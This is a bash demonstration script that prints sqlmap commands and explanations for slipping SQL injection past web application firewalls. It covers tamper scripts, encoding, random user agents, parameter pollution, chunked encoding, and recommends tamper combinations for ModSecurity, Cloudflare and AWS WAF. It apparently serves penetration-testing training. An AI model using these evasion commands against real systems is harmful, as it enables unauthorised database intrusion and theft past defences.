#!/usr/bin/env bash
# sqlmap/bypass-waf.sh — Use tamper scripts and techniques to evade WAF/IDS detection
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [target-url] [-h|--help]"
    echo ""
    echo "Description:"
    echo "  Demonstrates WAF/IDS evasion techniques using sqlmap tamper scripts."
    echo "  Tamper scripts modify SQL injection payloads to bypass web application"
    echo "  firewalls and intrusion detection systems."
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")                                                    # Show bypass techniques"
    echo "  $(basename "$0") 'http://target/page.php?id=1'                      # Target a URL"
    echo "  $(basename "$0") --help                                             # Show this help message"
}

[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0

require_cmd sqlmap "brew install sqlmap"

TARGET="${1:-}"

safety_banner

info "=== WAF/IDS Bypass Techniques ==="
if [[ -n "$TARGET" ]]; then
    info "Target: ${TARGET}"
fi
echo ""

info "How tamper scripts work"
echo "   Tamper scripts modify SQL injection payloads before sending them."
echo "   They transform syntax that WAFs block into equivalent SQL that"
echo "   the database still understands but the WAF does not recognize."
echo ""
echo "   Common bypass strategies:"
echo "   - Replace spaces with comments: SELECT/**/1 FROM/**/users"
echo "   - Use BETWEEN instead of comparison operators"
echo "   - Encode characters: %53%45%4C%45%43%54 = SELECT"
echo "   - Randomize case: SeLeCt, sElEcT"
echo "   - Use equivalent functions: MID() instead of SUBSTRING()"
echo ""
echo "   Additional evasion techniques:"
echo "   - Random User-Agent headers to avoid fingerprinting"
echo "   - Delays between requests to avoid rate limiting"
echo "   - HTTP parameter pollution to confuse parsers"
echo "   - Chunked transfer encoding to split payloads"
echo ""

URL="${TARGET:-'http://target/page.php?id=1'}"

# 1. Space-to-comment bypass
info "1) Space-to-comment bypass — replaces spaces with /**/"
echo "   sqlmap -u ${URL} --batch --tamper=space2comment"
echo ""

# 2. Between-function bypass
info "2) Between bypass — replaces > with NOT BETWEEN 0 AND"
echo "   sqlmap -u ${URL} --batch --tamper=between"
echo ""

# 3. Character encoding bypass
info "3) Character encoding bypass — URL-encodes all characters"
echo "   sqlmap -u ${URL} --batch --tamper=charencode"
echo ""

# 4. Random case bypass
info "4) Random case bypass — randomizes keyword capitalization"
echo "   sqlmap -u ${URL} --batch --tamper=randomcase"
echo ""

# 5. Combine multiple tamper scripts
info "5) Combine multiple tamper scripts for stronger evasion"
echo "   sqlmap -u ${URL} --batch --tamper=space2comment,between,randomcase"
echo ""

# 6. Random user agent + delay
info "6) Random user agent + delay between requests"
echo "   sqlmap -u ${URL} --batch --random-agent --delay=2"
echo ""

# 7. HTTP parameter pollution
info "7) HTTP parameter pollution"
echo "   sqlmap -u ${URL} --batch --hpp"
echo ""

# 8. Chunked transfer encoding
info "8) Chunked transfer encoding — splits payload across chunks"
echo "   sqlmap -u ${URL} --batch --chunked"
echo ""

# 9. Use a proxy for manual verification
info "9) Route through a proxy for manual payload inspection"
echo "   sqlmap -u ${URL} --batch --proxy=http://127.0.0.1:8080 --tamper=space2comment"
echo ""

# 10. List all available tamper scripts
info "10) List all available tamper scripts"
echo "    sqlmap --list-tampers"
echo ""

# Interactive demo (skip if non-interactive, e.g. running via make)
[[ ! -t 0 ]] && exit 0

echo ""
info "Tamper scripts by WAF type:"
echo ""
echo "   ModSecurity / OWASP CRS:"
echo "   --tamper=space2comment,between,randomcase,charencode"
echo ""
echo "   Cloudflare:"
echo "   --tamper=between,randomcase,space2comment --random-agent"
echo ""
echo "   AWS WAF:"
echo "   --tamper=charencode,space2comment --chunked --random-agent"
echo ""
echo "   Generic / Unknown WAF:"
echo "   --tamper=space2comment,between,randomcase,charencode --random-agent --delay=1"
echo ""
echo "   Tips:"
echo "   - Start with a single tamper and add more if blocked"
echo "   - Use --proxy=http://127.0.0.1:8080 with Burp Suite to inspect payloads"
echo "   - Combine tamper scripts with --delay and --random-agent"
echo "   - Run sqlmap --list-tampers for the full list with descriptions"
echo ""
